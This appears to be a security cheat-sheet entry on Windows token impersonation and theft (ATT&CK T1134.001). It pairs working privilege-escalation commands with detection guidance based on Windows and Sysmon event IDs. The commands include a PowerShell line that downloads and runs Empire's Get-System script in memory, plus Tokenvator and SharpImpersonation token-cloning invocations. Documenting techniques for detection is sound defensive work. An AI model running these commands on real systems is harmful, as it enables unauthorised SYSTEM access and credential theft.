


Token Impersonation / Theft T1134.001

getsystem

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
```

```cmd
Tokenvator.exe Clone_Token /Process:2456 /Command:powershell.exe
```

```cmd
SharpImpersonation.exe soheil\administrator binary:"powershell.exe whoami;pause"
```


Windows Event Viewer:

- Event ID 4688 (Windows Server 2008 and later): A new process has been created, which could indicate the launch of a process attempting to manipulate access tokens.
    
- Event ID 4672 (Windows Server 2008 and later): Special privileges assigned to a new logon, which could indicate an adversary attempting to escalate privileges by assigning special privileges to an access token.
    

Sysmon:

- Event ID 1 - Process creation: Monitor for the creation of processes related to token manipulation or credential theft, such as mimikatz.exe, procdump.exe, or tokenvator.exe.
    
- Event ID 10 - Process accessed: Monitor for processes accessing other processes related to token manipulation or credential theft, such as lsass.exe.

T1134.001

Windows Event Viewer:

- Event ID 4624 (Windows Server 2008 and later): An account was successfully logged on, which could indicate an adversary impersonating a user after stealing an access token.
    
- Event ID 4672 (Windows Server 2008 and later): Special privileges assigned to a new logon, which could indicate an adversary attempting to escalate privileges by assigning special privileges to an impersonated user.
    

Sysmon:

- Event ID 1 - Process creation: Monitor for the creation of processes related to token impersonation or theft, such as mimikatz.exe, procdump.exe, or tokenvator.exe.
    
- Event ID 10 - Process accessed: Monitor for processes accessing other processes related to token impersonation or theft, such as lsass.exe.